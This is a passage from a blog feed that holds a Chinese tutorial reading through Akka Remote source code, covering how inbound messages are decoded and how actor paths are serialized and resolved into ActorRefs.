class="keyword">extends</span> <span class="title">AssociationHandle</span> </span>&#123;</span><br><span class="line">  <span class="keyword">import</span> transport.executionContext</span><br><span class="line"> </span><br><span class="line">  override val readHandlerPromise: Promise[HandleEventListener] = Promise()</span><br><span class="line"> </span><br><span class="line">  <span class="function">override def <span class="title">write</span><span class="params">(payload: ByteString)</span>: Boolean </span>=</span><br><span class="line">    <span class="keyword">if</span> (channel.isWritable &amp;&amp; channel.isOpen) &#123;</span><br><span class="line">      channel.write(ChannelBuffers.wrappedBuffer(payload.asByteBuffer))</span><br><span class="line">      <span class="keyword">true</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="function"><span class="keyword">false</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function">  override def <span class="title">disassociate</span><span class="params">()</span>: Unit </span>= NettyTransport.gracefulClose(channel)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-2-节点管理"><a href="#3-2-节点管理" class="headerlink" title="3.2 节点管理"></a>3.2 节点管理</h3><pre><code>  由此可见，readHandlerPromise是一个Promise[HandleEventListener]，并没有具体赋值的逻辑，这就要去使用TcpAssociationHandle的相关代码找相关的赋值逻辑了。TcpAssociationHandle在哪里使用呢？还记得handleInboundAssociation建立连接的过程吗？它最终调用了createAndRegisterEndpoint</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> def <span class="title">createAndRegisterEndpoint</span><span class="params">(handle: AkkaProtocolHandle)</span>: Unit </span>= &#123;</span><br><span class="line">  val writing = settings.UsePassiveConnections &amp;&amp; !endpoints.hasWritableEndpointFor(handle.remoteAddress)</span><br><span class="line">  eventPublisher.notifyListeners(AssociatedEvent(handle.localAddress, handle.remoteAddress, inbound = <span class="keyword">true</span>))</span><br><span class="line"> </span><br><span class="line">  val endpoint = createEndpoint(</span><br><span class="line">    handle.remoteAddress,</span><br><span class="line">    handle.localAddress,</span><br><span class="line">    transportMapping(handle.localAddress),</span><br><span class="line">    settings,</span><br><span class="line">    Some(handle),</span><br><span class="line">    writing)</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (writing)</span><br><span class="line">    endpoints.registerWritableEndpoint(handle.remoteAddress, Some(handle.handshakeInfo.uid), endpoint)</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    endpoints.registerReadOnlyEndpoint(handle.remoteAddress, endpoint, handle.handshakeInfo.uid)</span><br><span class="line">    <span class="keyword">if</span> (!endpoints.hasWritableEndpointFor(handle.remoteAddress))</span><br><span class="line">      endpoints.removePolicy(handle.remoteAddress)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>createAndRegisterEndpoint拿着一个连接实例AkkaProtocolHandle创建了一个endpoint，其中有个很关键的字段writing，它是true还是false呢？UsePassiveConnections默认为true，且经分析!endpoints.hasWritableEndpointFor(handle.remoteAddress)应该也是true，所以writing是true</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Reuse inbound connections <span class="keyword">for</span> outbound messages</span><br><span class="line">use-passive-connections = on</span><br></pre></td></tr></table></figure><p>ReliableDeliverySupervisor其实是对EndpointWriter的代理。在创建ReliableDeliverySupervisor的过程中AkkaProtocolHandle是作为参数传入的，也就监听到连接消息后创建的handle。而在创建EndpointWriter的过程中，这个handle又是作为第一个参数传入了EndpointWriter。我们来看看EndpointWriter是如何使用这个handle的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">override def <span class="title">preStart</span><span class="params">()</span>: Unit </span>= &#123;</span><br><span class="line">   handle match &#123;</span><br><span class="line">     <span class="function"><span class="keyword">case</span> <span class="title">Some</span><span class="params">(h)</span> ⇒</span></span><br><span class="line"><span class="function">       reader </span>= startReadEndpoint(h)</span><br><span class="line">     <span class="keyword">case</span> None ⇒</span><br><span class="line">       transport.associate(remoteAddress, refuseUid).map(Handle(_)) pipeTo self</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>在preStart时，handle应该是有值的，如果有值，就调用了startReadEndpoint(h)方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> def <span class="title">startReadEndpoint</span><span class="params">(handle: AkkaProtocolHandle)</span>: Some[ActorRef] </span>= &#123;</span><br><span class="line">    val newReader =</span><br><span class="line">      context.watch(context.actorOf(</span><br><span class="line">        RARP(context.system).configureDispatcher(EndpointReader.props(localAddress, remoteAddress, transport, settings, codec,</span><br><span class="line">          msgDispatch, inbound, handle.handshakeInfo.uid, reliableDeliverySupervisor, receiveBuffers)).withDeploy(Deploy.local),</span><br><span class="line">        <span class="string">&quot;endpointReader-&quot;</span> + AddressUrlEncoder(remoteAddress) + <span class="string">&quot;-&quot;</span> + readerId.next()))</span><br><span class="line">    handle.readHandlerPromise.success(ActorHandleEventListener(newReader))</span><br><span class="line">    Some(newReader)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>startReadEndpoint做了什么呢？它又创建了一个Actor：EndpointReader！！！好多中间的actor创建。创建之后，调用了handle.readHandlerPromise.success(ActorHandleEventListener(newReader))给handle.readHandlerPromise。还记得ActorHandleEventListener吗，它就是把收到的消息转发了对应的actor，此处就是newReader。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1632652170834-4126b27a-81fd-41d9-858f-5315162d46e9.png#clientId=u15d7a13d-fab5-4&from=paste&id=u69c57aba&margin=%5Bobject%20Object%5D&originHeight=494&originWidth=931&originalType=url&ratio=1&status=done&style=none&taskId=u48b42796-f94c-4a82-b9a1-c5dbd8013e6"></p><h3 id="3-3-消息解码"><a href="#3-3-消息解码" class="headerlink" title="3.3 消息解码"></a>3.3 消息解码</h3><p>EndpointReader如何处理InboundPayload消息呢？首先解码收到的消息，然后给创建它的reliableDelivery发送ack消息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">override def <span class="title">decodeMessage</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  raw:          ByteString,</span></span></span><br><span class="line"><span class="params"><span class="function">  provider:     RemoteActorRefProvider,</span></span></span><br><span class="line"><span class="params"><span class="function">  localAddress: Address)</span>: <span class="params">(Option[Ack], Option[Message])</span> </span>= &#123;</span><br><span class="line">  val ackAndEnvelope = AckAndEnvelopeContainer.parseFrom(raw.toArray)</span><br><span class="line"> </span><br><span class="line">  val ackOption = <span class="keyword">if</span> (ackAndEnvelope.hasAck) &#123;</span><br><span class="line">    <span class="keyword">import</span> scala.collection.JavaConverters.<span class="function">_</span></span><br><span class="line"><span class="function">    <span class="title">Some</span><span class="params">(Ack(SeqNo(ackAndEnvelope.getAck.getCumulativeAck)</span>, ackAndEnvelope.getAck.getNacksList.asScala.<span class="title">map</span><span class="params">(SeqNo(_)</span>).toSet))</span></span><br><span class="line"><span class="function">  &#125; <span class="keyword">else</span> None</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function">  val messageOption </span>= <span class="keyword">if</span> (ackAndEnvelope.hasEnvelope) &#123;</span><br><span class="line">    val msgPdu = ackAndEnvelope.<span class="function">getEnvelope</span></span><br><span class="line"><span class="function">    <span class="title">Some</span><span class="params">(Message(</span></span></span><br><span class="line"><span class="params"><span class="function">      recipient = provider.resolveActorRefWithLocalAddress(msgPdu.getRecipient.getPath, localAddress)</span>,</span></span><br><span class="line"><span class="function">      recipientAddress </span>= AddressFromURIString(msgPdu.getRecipient.getPath),</span><br><span class="line">      serializedMessage = msgPdu.getMessage,</span><br><span class="line">      senderOption =</span><br><span class="line">        <span class="keyword">if</span> (msgPdu.hasSender) OptionVal(provider.resolveActorRefWithLocalAddress(msgPdu.getSender.getPath, localAddress))</span><br><span class="line">        <span class="keyword">else</span> OptionVal.None,</span><br><span class="line">      seqOption =</span><br><span class="line">        <span class="keyword">if</span> (msgPdu.hasSeq) Some(SeqNo(msgPdu.getSeq)) <span class="keyword">else</span> None))</span><br><span class="line">  &#125; <span class="keyword">else</span> None</span><br><span class="line"> </span><br><span class="line">  (ackOption, messageOption)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面是decodeMessage的源码，消息最终被decode成了Message对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">case</span> class <span class="title">Message</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  recipient:         InternalActorRef,</span></span></span><br><span class="line"><span class="params"><span class="function">  recipientAddress:  Address,</span></span></span><br><span class="line"><span class="params"><span class="function">  serializedMessage: SerializedMessage,</span></span></span><br><span class="line"><span class="params"><span class="function">  senderOption:      OptionVal[ActorRef],</span></span></span><br><span class="line"><span class="params"><span class="function">  seqOption:         Option[SeqNo])</span> extends HasSequenceNumber </span>&#123;</span><br><span class="line"> </span><br><span class="line">  def reliableDeliveryEnabled = seqOption.isDefined</span><br><span class="line"> </span><br><span class="line">  override def seq: SeqNo = seqOption.get</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>默认情况下reliableDeliveryEnabled是false的，因为发送出去的msgPdu是没有getSeq的，因为默认的tcp是保证消息发送的。所以EndpointReader收到消息后调用了msgDispatch.dispatch把消息分发出去了。根据上下文msgDispatch是在EndpointWriter创建的，代码如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">val msgDispatch = <span class="keyword">new</span> DefaultMessageDispatcher(extendedSystem, provider, markLog)</span><br></pre></td></tr></table></figure><p>DefaultMessageDispatcher.dispatch不再具体分析，它就是把消息tell给了Message.recipient，而recipient是一个InternalActorRef，对的，你没有看错，这就是一个InternalActorRef，是不是很神奇，payload解码之后直接就有目标actor的InternalActorRef了？？！！那我们就得好好看看是如何对payload进行解码的了。<br>在decodeMessage函数中，有两处代码非常关键：“recipient = provider.resolveActorRefWithLocalAddress(msgPdu.getRecipient.getPath, localAddress)”、“if (msgPdu.hasSender) OptionVal(provider.resolveActorRefWithLocalAddress(msgPdu.getSender.getPath, localAddress))”。都是调用provider.resolveActorRefWithLocalAddress函数通过actor的path转化成了对应actor的ActorRef，很显然provider就是RemoteActorRefProvider。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * INTERNAL API</span></span><br><span class="line"><span class="comment">   * Called in deserialization of incoming remote messages where the correct local address is known.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">private</span>[akka] <span class="function">def <span class="title">resolveActorRefWithLocalAddress</span><span class="params">(path: String, localAddress: Address)</span>: InternalActorRef </span>= &#123;</span><br><span class="line">    path match &#123;</span><br><span class="line">      <span class="function"><span class="keyword">case</span> <span class="title">ActorPathExtractor</span><span class="params">(address, elems)</span> ⇒</span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(hasAddress(address)</span>)</span></span><br><span class="line"><span class="function">          local.<span class="title">resolveActorRef</span><span class="params">(rootGuardian, elems)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">else</span> <span class="keyword">try</span> </span>&#123;</span><br><span class="line">          <span class="keyword">new</span> RemoteActorRef(transport, localAddress, RootActorPath(address) / elems, Nobody, props = None, deploy = None)</span><br><span class="line">        &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">          <span class="function"><span class="keyword">case</span> <span class="title">NonFatal</span><span class="params">(e)</span> ⇒</span></span><br><span class="line"><span class="function">            log.<span class="title">warning</span><span class="params">(<span class="string">&quot;Error while resolving ActorRef [&#123;&#125;] due to [&#123;&#125;]&quot;</span>, path, e.getMessage)</span></span></span><br><span class="line"><span class="function">            new <span class="title">EmptyLocalActorRef</span><span class="params">(<span class="keyword">this</span>, RootActorPath(address)</span> / elems, eventStream)</span></span><br><span class="line"><span class="function">        &#125;</span></span><br><span class="line"><span class="function">      <span class="keyword">case</span> _ ⇒</span></span><br><span class="line"><span class="function">        log.<span class="title">debug</span><span class="params">(<span class="string">&quot;Resolve (deserialization) of unknown (invalid) path [&#123;&#125;], using deadLetters.&quot;</span>, path)</span></span></span><br><span class="line"><span class="function">        deadLetters</span></span><br><span class="line"><span class="function">    &#125;</span></span><br><span class="line"><span class="function">  &#125;</span></span><br></pre></td></tr></table></figure><p>resolveActorRefWithLocalAddress也很简单，如果目标address包含在本机范围，就调用local.resolveActorRef，否则就创建RemoteActorRef，关于RemoteActorRef的作用这里不再讲解。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * INTERNAL API</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span>[akka] <span class="function">def <span class="title">resolveActorRef</span><span class="params">(ref: InternalActorRef, pathElements: Iterable[String])</span>: InternalActorRef </span>=</span><br><span class="line">  <span class="keyword">if</span> (pathElements.isEmpty) &#123;</span><br><span class="line">    log.debug(<span class="string">&quot;Resolve (deserialization) of empty path doesn&#x27;t match an active actor, using deadLetters.&quot;</span>)</span><br><span class="line">    deadLetters</span><br><span class="line">  &#125; <span class="keyword">else</span> ref.getChild(pathElements.iterator) match &#123;</span><br><span class="line">    <span class="keyword">case</span> Nobody ⇒</span><br><span class="line">      <span class="keyword">if</span> (log.isDebugEnabled)</span><br><span class="line">        log.debug(</span><br><span class="line">          <span class="string">&quot;Resolve (deserialization) of path [&#123;&#125;] doesn&#x27;t match an active actor. &quot;</span> +</span><br><span class="line">            <span class="string">&quot;It has probably been stopped, using deadLetters.&quot;</span>,</span><br><span class="line">          pathElements.mkString(<span class="string">&quot;/&quot;</span>))</span><br><span class="line">      <span class="keyword">new</span> EmptyLocalActorRef(system.provider, ref.path / pathElements, eventStream)</span><br><span class="line">    <span class="keyword">case</span> x ⇒ x</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>LocalActorRefProvider.resolveActorRef也比较简单，就是调用ref.getChild，而ref是LocalActorRefProvider.rootGuardian，其实就是在本地范围内从root向下查找对应的ActorRef。<br>既然在收到消息时，是通过ActorPath找到对应的ActorRef的，那么发送消息的时候一定有把ActorRef转化成ActorPath的地方，关于这点我也带领大家验证一下。在之前的文章，我们分析过，发送消息是通过EndpointWriter.writeSend发送的，那就再来回顾一下这个函数。<br>​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">writeSend</span><span class="params">(s: Send)</span>: Boolean </span>= <span class="keyword">try</span> &#123;</span><br><span class="line">    handle match &#123;</span><br><span class="line">      <span class="function"><span class="keyword">case</span> <span class="title">Some</span><span class="params">(h)</span> ⇒</span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(provider.remoteSettings.LogSend &amp;&amp; log.isDebugEnabled)</span> </span>&#123;</span><br><span class="line">          def msgLog = s<span class="string">&quot;RemoteMessage: [$&#123;s.message&#125;] to [$&#123;s.recipient&#125;]&lt;+[$&#123;s.recipient.path&#125;] from [$&#123;s.senderOption.getOrElse(extendedSystem.deadLetters)&#125;]&quot;</span></span><br><span class="line">          log.debug(<span class="string">&quot;sending message &#123;&#125;&quot;</span>, msgLog)</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        val pdu = codec.constructMessage(</span><br><span class="line">          s.recipient.localAddressToUse,</span><br><span class="line">          s.recipient,</span><br><span class="line">          serializeMessage(s.message),</span><br><span class="line">          s.senderOption,</span><br><span class="line">          seqOption = s.seqOpt,</span><br><span class="line">          ackOption = lastAck)</span><br><span class="line"> </span><br><span class="line">        val pduSize = pdu.size</span><br><span class="line">        remoteMetrics.logPayloadBytes(s.message, pduSize)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (pduSize &gt; transport.maximumPayloadBytes) &#123;</span><br><span class="line">          val reason = <span class="keyword">new</span> OversizedPayloadException(s<span class="string">&quot;Discarding oversized payload sent to $&#123;s.recipient&#125;: max allowed size $&#123;transport.maximumPayloadBytes&#125; bytes, actual size of encoded $&#123;s.message.getClass&#125; was $&#123;pdu.size&#125; bytes.&quot;</span>)</span><br><span class="line">          log.error(reason, <span class="string">&quot;Transient association error (association remains live)&quot;</span>)</span><br><span class="line">          <span class="keyword">true</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          val ok = h.write(pdu)</span><br><span class="line">          <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">            ackDeadline = newAckDeadline</span><br><span class="line">            lastAck = None</span><br><span class="line">          &#125;</span><br><span class="line">          ok</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">case</span> None ⇒</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> EndpointException(<span class="string">&quot;Internal error: Endpoint is in state Writing, but no association handle is present.&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> e: NotSerializableException ⇒</span><br><span class="line">      log.error(e, <span class="string">&quot;Serializer not defined for message type [&#123;&#125;]. Transient association error (association remains live)&quot;</span>, s.message.getClass)</span><br><span class="line">      <span class="keyword">true</span></span><br><span class="line">    <span class="keyword">case</span> e: IllegalArgumentException ⇒</span><br><span class="line">      log.error(e, <span class="string">&quot;Serializer not defined for message type [&#123;&#125;]. Transient association error (association remains live)&quot;</span>, s.message.getClass)</span><br><span class="line">      <span class="keyword">true</span></span><br><span class="line">    <span class="keyword">case</span> e: MessageSerializer.SerializationException ⇒</span><br><span class="line">      log.error(e, <span class="string">&quot;&#123;&#125; Transient association error (association remains live)&quot;</span>, e.getMessage)</span><br><span class="line">      <span class="keyword">true</span></span><br><span class="line">    <span class="keyword">case</span> e: EndpointException ⇒</span><br><span class="line">      publishAndThrow(e, Logging.ErrorLevel)</span><br><span class="line">    <span class="function"><span class="keyword">case</span> <span class="title">NonFatal</span><span class="params">(e)</span> ⇒</span></span><br><span class="line"><span class="function">      <span class="title">publishAndThrow</span><span class="params">(new EndpointException(<span class="string">&quot;Failed to write message to the transport&quot;</span>, e)</span>, Logging.ErrorLevel)</span></span><br><span class="line"><span class="function">  &#125;</span></span><br></pre></td></tr></table></figure><p>在发送之前，调用了codec.constructMessage把消息相关的数据都编码进了pdu，具体如何进行编码的呢？<br>​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">override def <span class="title">constructMessage</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    localAddress:      Address,</span></span></span><br><span class="line"><span class="params"><span class="function">    recipient:         ActorRef,</span></span></span><br><span class="line"><span class="params"><span class="function">    serializedMessage: SerializedMessage,</span></span></span><br><span class="line"><span class="params"><span class="function">    senderOption:      OptionVal[ActorRef],</span></span></span><br><span class="line"><span class="params"><span class="function">    seqOption:         Option[SeqNo]       = None,</span></span></span><br><span class="line"><span class="params"><span class="function">    ackOption:         Option[Ack]         = None)</span>: ByteString </span>= &#123;</span><br><span class="line"> </span><br><span class="line">    val ackAndEnvelopeBuilder = AckAndEnvelopeContainer.newBuilder</span><br><span class="line"> </span><br><span class="line">    val envelopeBuilder = RemoteEnvelope.newBuilder</span><br><span class="line"> </span><br><span class="line">    envelopeBuilder.setRecipient(serializeActorRef(recipient.path.address, recipient))</span><br><span class="line">    senderOption match &#123;</span><br><span class="line">      <span class="keyword">case</span> OptionVal.Some(sender) ⇒ envelopeBuilder.setSender(serializeActorRef(localAddress, sender))</span><br><span class="line">      <span class="keyword">case</span> OptionVal.None         ⇒</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    seqOption foreach &#123; seq ⇒ envelopeBuilder.setSeq(seq.rawValue) &#125;</span><br><span class="line">    ackOption foreach &#123; ack ⇒ ackAndEnvelopeBuilder.setAck(ackBuilder(ack)) &#125;</span><br><span class="line">    envelopeBuilder.setMessage(serializedMessage)</span><br><span class="line">    ackAndEnvelopeBuilder.setEnvelope(envelopeBuilder)</span><br><span class="line"> </span><br><span class="line">    ByteString.ByteString1C(ackAndEnvelopeBuilder.build.toByteArray) <span class="comment">//Reuse Byte Array (naughty!)</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>看到serializeActorRef了吗，它把ActorRef（这里分别是recipient和sender）进行了序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> def <span class="title">serializeActorRef</span><span class="params">(defaultAddress: Address, ref: ActorRef)</span>: ActorRefData </span>= &#123;</span><br><span class="line">    ActorRefData.newBuilder.setPath(</span><br><span class="line">      <span class="keyword">if</span> (ref.path.address.host.isDefined) ref.path.toSerializationFormat <span class="keyword">else</span> ref.path.toSerializationFormatWithAddress(defaultAddress)).build()</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>其实serializeActorRef也比较简单，如果当前ActorRef是本地（有host字段）则直接调用path.toSerializationFormat，否则调用toSerializationFormatWithAddress(defaultAddress)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Generate full String representation including the</span></span><br><span class="line"><span class="comment"> * uid for the actor cell instance as URI fragment.</span></span><br><span class="line"><span class="comment"> * This representation should be used as serialized</span></span><br><span class="line"><span class="comment"> * representation instead of `toString`.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">def toSerializationFormat: String</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Generate full String representation including the uid for the actor cell</span></span><br><span class="line"><span class="comment"> * instance as URI fragment, replacing the Address in the RootActor Path</span></span><br><span class="line"><span class="comment"> * with the given one unless this path’s address includes host and port</span></span><br><span class="line"><span class="comment"> * information. This representation should be used as serialized</span></span><br><span class="line"><span class="comment"> * representation instead of `toStringWithAddress`.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">def <span class="title">toSerializationFormatWithAddress</span><span class="params">(address: Address)</span>: String</span></span><br></pre></td></tr></table></figure><p>toSerializationFormat和toSerializationFormatWithAddress的功能官网注释已经解释的很清楚，我就不啰嗦了，不过这直接验证了在发送消息时把ActorRef序列化成对应ActorPath的String的猜测。那么在收到消息时就可以通过ActorPath找到具体的ActorRef了。<br>至此remote模式下收发消息的过程我们就分析清楚了，如果还有不清楚的小伙伴就再把之前的文章复习一下，当然还可以在下面留言讨论。<br>​</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/gabry/p/9390621.html">https://www.cnblogs.com/gabry/p/9390621.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1.概述&quot;&gt;&lt;/a&gt;1.概述&lt;/h2&gt;&lt;p&gt;在上文中，我们分析了网络链接建立的过程，一旦建立就可以正常的收发消息了。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;发送消息的细节不再分析，</summary>
      
    
    
    
    <category term="network" scheme="https://wuhaocn.github.io/categories/network/"/>
    
    
    <category term="akka" scheme="https://wuhaocn.github.io/tags/akka/"/>
    
  </entry>
  
  <entry>
    <title>Akka-Remote-发消息</title>
    <link href="https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Remote-%E5%8F%91%E6%B6%88%E6%81%AF/"/>
    <id>https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Remote-%E5%8F%91%E6%B6%88%E6%81%AF/</id>
    <published>2021-12-03T07:48:55.013Z</published>
    <updated>2021-12-03T09:07:15.176Z</updated>
    
